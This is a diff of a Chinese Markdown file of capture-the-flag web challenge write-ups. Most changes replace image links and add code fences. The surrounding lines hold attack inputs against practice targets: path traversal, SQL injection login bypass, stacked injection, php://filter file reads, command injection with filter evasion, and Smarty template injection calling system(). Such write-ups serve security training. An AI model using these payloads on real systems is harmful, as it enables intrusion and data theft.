@@ -70,6 +70,8 @@ php代码属于服务端,html属于客户端
 #### [HCTF 2018]WarmUp
 考察点:1.代码审计
     2.任意文件包含
+  
+```
 <?php
     highlight_file(__FILE__);
     class emmm
@@ -117,15 +119,19 @@ php代码属于服务端,html属于客户端
 ?> 
 
 ```
+
+```
 index.php?file=hint.php?../../../../../ffffllllaaaagggg
 
 ```
 #### [极客大挑战 2019]EasySQL
 考察点:sql注入之万能密码
-图片: https://uploader.shimo.im/f/fHYh1XRYQDRo4VmD.png
+![image](https://user-images.githubusercontent.com/81904597/115139394-3c3e1a80-a021-11eb-9dd2-afc5784d869c.png)
+
 sql注入题目使用万能密码登录获得flag
 check.php?username=cl4y&password=1'or'1'='1 
-图片: https://uploader.shimo.im/f/ptdsTKh5mcRNr4gr.png
+![image](https://user-images.githubusercontent.com/81904597/115139409-48c27300-a021-11eb-9eec-a9f7abc0de67.png)
+
 
 #### [强网杯 2019]随便注
 考察点:1.堆叠注入
@@ -134,7 +140,9 @@ check.php?username=cl4y&password=1'or'1'='1
         2.预处理语句
         3.handler
 ?inject=1%27%3B+show+columns+from+%601919810931114514%60%3B#
-图片: https://uploader.shimo.im/f/xGwX3AoF1sc7N7tq.png
+![image](https://user-images.githubusercontent.com/81904597/115139421-55df6200-a021-11eb-9982-07aa7bee68f7.png)
+
+
 改表
 
 ```
@@ -161,12 +169,15 @@ check.php?username=cl4y&password=1'or'1'='1
 
 #### [ACTF2020 新生赛]Include
 考察点:文件包含漏洞
-图片: https://uploader.shimo.im/f/xzSvAf2PCGAwVcW3.png
+![image](https://user-images.githubusercontent.com/81904597/115139435-6394e780-a021-11eb-9b50-22009d89c411.png)
+
 直接用伪协议读取
 ?file=php://filter/convert.base64-encode/resource=flag.php
 [极客大挑战 2019]Secret File
-图片: https://uploader.shimo.im/f/SbGK46C5yBDq5KYC.png
-图片: https://uploader.shimo.im/f/6PLm98UksiEvVZil.png
+
+![image](https://user-images.githubusercontent.com/81904597/115139440-714a6d00-a021-11eb-9554-c65bc6640fd5.png)
+![image](https://user-images.githubusercontent.com/81904597/115139447-7a3b3e80-a021-11eb-9d01-f2e24934ce25.png)
+
 
 ```
 <html>
@@ -197,7 +208,8 @@ secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
 127.0.0.1;cat /f*
 128.
 ``` 
-图片: https://uploader.shimo.im/f/QFN8VHS7kcmYeQFF.png
+![image](https://user-images.githubusercontent.com/81904597/115139483-a22aa200-a021-11eb-8528-b2220d6c4b83.png)
+
 
 #### [GXYCTF2019]Ping Ping Ping
 ?ip=1;a=g;cat$IFS$1fla$a.php;
@@ -207,15 +219,21 @@ secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
 Build With Smarty !
 Smarty是一个PHP下的网页模板系统。Smarty基本上是一种为了将不同考量的事情分离而推出的工具，这对某些应用程序是一种共通性设计策略。
 根据提示在X-Forward-For处存在注入
-图片: https://uploader.shimo.im/f/PIxS8IqgeZEWTHNz.png
+
+![image](https://user-images.githubusercontent.com/81904597/115139490-af479100-a021-11eb-89fa-e7bf108c2c0b.png)
+
 输入
 {$smarty.version}
 判断是否为smarty注入
-图片: https://uploader.shimo.im/f/lbuLIfHuM1x4j1fk.png
+
+![image](https://user-images.githubusercontent.com/81904597/115139500-b79fcc00-a021-11eb-8f93-d7a2abf7ba87.png)
+
 {if phpinfo()}{/if}  返回phpinfo
-图片: https://uploader.shimo.im/f/14HO2ynWp4PuyDqe.png
+![image](https://user-images.githubusercontent.com/81904597/115139518-c2f2f780-a021-11eb-9486-ea2a7a9d3985.png)
+
 {if system('cat ../../../flag')}{/if}
-图片: https://uploader.shimo.im/f/0H2OrzkOTrqgELzR.png
+![image](https://user-images.githubusercontent.com/81904597/115139527-cc7c5f80-a021-11eb-9702-74e5589cba79.png)
+
 
 2020/4/18
 
@@ -448,12 +466,11 @@ if (strlen($filename) < 40 && $file->open($filename)) {
 ?>
 
 ```
-图片: https://uploader.shimo.im/f/z7e1xTlx06NQ66bi.png
+![image](https://user-images.githubusercontent.com/81904597/115139539-ddc56c00-a021-11eb-8587-df01484430e8.png)
+![image](https://user-images.githubusercontent.com/81904597/115139544-e74ed400-a021-11eb-8c93-2696795fdbb6.png)
+![image](https://user-images.githubusercontent.com/81904597/115139549-efa70f00-a021-11eb-93ed-a0b962e7f825.png)
 
 
-图片: https://uploader.shimo.im/f/ehtbIds6W9BhwvJG.png
-
-图片: https://uploader.shimo.im/f/dg8wEZTT3K7JLMB2.png
 exp:
 
 ```
@@ -512,7 +529,8 @@ https://xz.aliyun.com/t/2715
 
 #### [BSidesCF 2019]Futurella
 查看源代码即可得到flag
-图片: https://uploader.shimo.im/f/kO5rcpLtxFOKbBq3.png
+![image](https://user-images.githubusercontent.com/81904597/115139561-02214880-a022-11eb-8d10-c33ed6d3eb7a.png)
+
 [GWCTF 2019]枯燥的抽奖
 考察点:php伪随机数漏洞
 前言:
@@ -568,7 +586,9 @@ for i in range(len(str2)):
 print(res)
 ```
 利用php_mt_seed生成种子
-图片: https://uploader.shimo.im/f/TeKuIWIkXNr2BRr3.png
+
+![image](https://user-images.githubusercontent.com/81904597/115139572-0fd6ce00-a022-11eb-8f7e-5420cdb2eacf.png)
+
 
 利用生成的种子生成序列提交即可获得flag
 
@@ -590,7 +610,6 @@ echo $str;
 
 ```
 
-图片: https://uploader.shimo.im/f/BBmV6Qn9Rwzu6z27.png
 
 #### [MRCTF2020]套娃
 考点:1.代码审计
@@ -611,7 +630,8 @@ $query = $_SERVER['QUERY_STRING'];
 使用.可绕过_,preg_match没有/m，因此用%0a就可以了
 ?b.u.p.t=23333%0a
 进入了下一关
-图片: https://uploader.shimo.im/f/Q16pix1M9BlgOb5q.png
+![image](https://user-images.githubusercontent.com/81904597/115139587-372d9b00-a022-11eb-81a3-cbc96269d004.png)
+
 查看网页源代码有一段Jsfuck，Merak post提交获得源码
 
 ```
@@ -674,5 +694,6 @@ $a='flag.php';
 echo change($a);
 
 ```
-图片: https://uploader.shimo.im/f/dhl138dUqL2lCVwc.png
+![image](https://user-images.githubusercontent.com/81904597/115139578-28df7f00-a022-11eb-82d9-0f415b774487.png)
+
 
